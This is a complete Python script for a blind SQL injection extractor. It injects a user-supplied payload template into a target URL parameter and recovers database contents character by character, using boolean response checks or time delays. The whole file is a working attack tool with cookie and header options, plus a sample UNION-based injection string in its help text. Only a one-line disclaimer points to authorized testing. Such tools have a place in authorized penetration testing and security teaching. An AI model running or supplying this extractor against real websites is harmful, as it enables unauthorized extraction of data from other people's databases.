import requests
import argparse
import sys
import time
from string import printable

# extract parameters
def extract(args):
    probe = args.charset
    result = ""
    session = requests.Session()
    session.headers.update({
        "User-Agent": args.user_agent or "Mozilla/5.0",
        "Accept": "*/*",
        "Connection": "close",
    })

    if args.cookie:
        session.headers["Cookie"] = args.cookie
    for h in args.header or []:
        if ":" in h:
            k, v = h.split(":", 1)
            session.headers[k.strip()] = v.strip()

    while True:
        found = False
        for elem in probe:
            payload = args.payload.replace("{PAYLOAD}", result + elem)
            try:
                if args.method == "POST":
                    response = session.post(
                        args.url,
                        data={args.param: payload} if args.param else payload,
                        timeout=args.timeout,
                        allow_redirects=not args.no_redirect,
                    )
                else:
                    response = session.get(
                        args.url,
                        params={args.param: payload} if args.param else None,
                        timeout=args.timeout,
                        allow_redirects=not args.no_redirect,
                    )
            except requests.RequestException as e:
                print(f"\n[!] Request error: {e}", file=sys.stderr)
                sys.exit(1)

            # --- True signal ---
            if args.technique == "boolean":
                if args.match == "length":
                    is_true = len(response.content) == args.true_length
                elif args.match == "status":
                    is_true = response.status_code == args.true_status
                elif args.match == "regex":
                    is_true = bool(__import__("re").search(args.true_regex, response.text))
                elif args.match == "contains":
                    is_true = args.true_string in response.text
                else:
                    is_true = False
            elif args.technique == "time":
                # time-based: check time
                start = time.time()
                try:
                    if args.method == "POST":
                        session.post(args.url, data={args.param: payload}, timeout=args.timeout)
                    else:
                        session.get(args.url, params={args.param: payload}, timeout=args.timeout)
                except requests.RequestException:
                    pass
                elapsed = time.time() - start
                is_true = elapsed >= args.delay
            else:
                is_true = False

            if is_true:
                result += elem
                found = True
                print(f"\r{result}", end="", flush=True)
                break

            if elem != probe[-1]:
                print(f"\r{result}{elem}", end="", flush=True)

        if not found:
            print(f"\n[+] Extracted: {result}")
            return result

def main():
    parser = argparse.ArgumentParser(
        description="Universal blind SQLi extractor. "
                    "User supplies a payload template with {PAYLOAD} placeholder. "
                    "For authorized security testing and educational purposes only."
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", default=None, help="Vulnerable parameter name (omit to send raw payload)")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--payload", required=True,
                        help="Payload template with {PAYLOAD} placeholder, e.g. "
                             "\"' UNION SELECT 1,2,3,4 WHERE database() LIKE '{PAYLOAD}%'-- -\"")
    parser.add_argument("--technique", choices=["boolean", "time"], default="boolean")
    parser.add_argument("--match", choices=["length", "status", "regex", "contains"], default="length",
                        help="How to detect TRUE condition (boolean technique)")
    parser.add_argument("--true-length", type=int, default=None, help="Response length for TRUE (match=length)")
    parser.add_argument("--true-status", type=int, default=200, help="Status code for TRUE (match=status)")
    parser.add_argument("--true-regex", default=None, help="Regex for TRUE (match=regex)")
    parser.add_argument("--true-string", default=None, help="Substring for TRUE (match=contains)")
    parser.add_argument("--delay", type=float, default=3.0, help="Delay in seconds for time-based TRUE")
    parser.add_argument("--charset", default=printable.strip(),
                        help="Characters to probe (default: printable ASCII)")
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--no-redirect", action="store_true", help="Disable following redirects")
    parser.add_argument("--user-agent", default=None)
    parser.add_argument("--cookie", default=None, help="Cookie header value")
    parser.add_argument("--header", action="append", help="Extra header 'Key: Value' (can repeat)")
    args = parser.parse_args()

    if args.technique == "boolean":
        if args.match == "length" and args.true_length is None:
            parser.error("--true-length is required when --match=length")
        if args.match == "regex" and not args.true_regex:
            parser.error("--true-regex is required when --match=regex")
        if args.match == "contains" and not args.true_string:
            parser.error("--true-string is required when --match=contains")

    if "{PAYLOAD}" not in args.payload:
        parser.error("--payload must contain {PAYLOAD} placeholder")

    extract(args)

if __name__ == "__main__":
    main()
